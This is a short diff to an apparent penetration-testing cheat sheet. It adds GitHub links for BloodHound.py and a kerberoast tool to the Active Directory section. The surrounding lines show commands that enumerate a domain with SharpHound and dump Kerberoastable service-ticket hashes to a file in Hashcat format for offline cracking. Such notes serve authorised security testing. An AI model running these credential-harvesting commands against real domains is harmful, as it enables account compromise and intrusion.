@@ -750,6 +750,7 @@ Active Directory
          . .\sharphound.ps1  
          Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName file.zip  
          Download zip onto kali, import into bloodhound  
+         https://github.com/fox-it/BloodHound.py
          
 <br>
 
@@ -775,7 +776,8 @@ Active Directory
 `Kerberoasting`
 
          Invoke-Kerberoast in powerview  
-         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000  
+         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
+         https://github.com/skelsec/kerberoast
          
 <br>
 
